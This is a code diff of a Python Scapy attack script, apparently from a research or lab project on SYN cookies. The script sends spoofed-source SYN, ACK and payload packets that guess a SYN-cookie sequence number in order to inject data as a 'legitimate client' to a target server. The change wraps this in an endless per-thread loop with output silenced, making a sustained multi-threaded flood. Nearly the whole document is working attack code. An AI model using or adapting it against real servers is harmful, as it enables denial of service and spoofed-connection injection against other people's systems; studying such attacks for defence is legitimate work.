@@ -20,30 +20,31 @@ bps = (empty_size + empty_size + empty_size + packet_size + empty_size) / connec
 
 
 def connection(_: None):
-    sport = random_port()
-    syn = (
-            Ether()
-            / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
-            / TCP(sport=sport, dport=config.server_port, flags='S')
-    )
-    guesses_seq = random.randint(0, 2 ** 32 - 1)  # for syn cookies
-    ack = (
-            Ether()
-            / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
-            / TCP(sport=sport, dport=config.server_port, flags='A', seq=guesses_seq)
-    )
-    payload_pkt = (
-            Ether()
-            / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
-            / TCP(sport=sport, dport=config.server_port, flags='P', seq=guesses_seq + 1)
-            / payload
-    )
-    sendp([
-        syn,
-        ack,
-        payload_pkt,
-    ])
-    time.sleep(connection_time)
+    while True:
+        sport = random_port()
+        syn = (
+                Ether()
+                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
+                / TCP(sport=sport, dport=config.server_port, flags='S')
+        )
+        guesses_seq = random.randint(0, 2 ** 32 - 1)  # for syn cookies
+        ack = (
+                Ether()
+                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
+                / TCP(sport=sport, dport=config.server_port, flags='A', seq=guesses_seq)
+        )
+        payload_pkt = (
+                Ether()
+                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
+                / TCP(sport=sport, dport=config.server_port, flags='P', seq=guesses_seq + 1)
+                / payload
+        )
+        sendp([
+            syn,
+            ack,
+            payload_pkt,
+        ], verbose=False)
+        time.sleep(connection_time)
 
 
 def run():
@@ -57,7 +58,5 @@ def run():
                 f"{bps} "
                 f"{threads} ")
 
-    while True:
-        with ThreadPool(threads) as pool:
-            pool.map(connection, [None] * threads)
-            pool.join()
+    with ThreadPool(threads) as pool:
+        pool.map(connection, [None] * threads)
